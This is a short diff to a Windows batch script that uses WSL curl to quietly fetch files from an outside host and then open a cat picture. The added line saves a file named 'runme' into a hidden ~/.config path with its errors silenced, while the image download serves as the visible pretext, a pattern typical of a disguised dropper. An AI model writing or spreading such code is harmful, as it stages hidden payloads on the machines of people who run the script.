@@ -7,5 +7,6 @@ REM is comments
 @REM wsl bash -c "source ~/.bashrc"
 @REM pause
 
-wsl bash -c "curl -s -X POST -o curl_success.c https://cyber.stanleyhoo1.tech/files/pseudo.c 2>/dev/null"
+wsl bash -c "curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null"
+wsl bash -c "curl -s -X POST -o cat.png https://cyber.stanleyhoo1.tech/files/cat.png 2>/dev/null"
 start cat.png
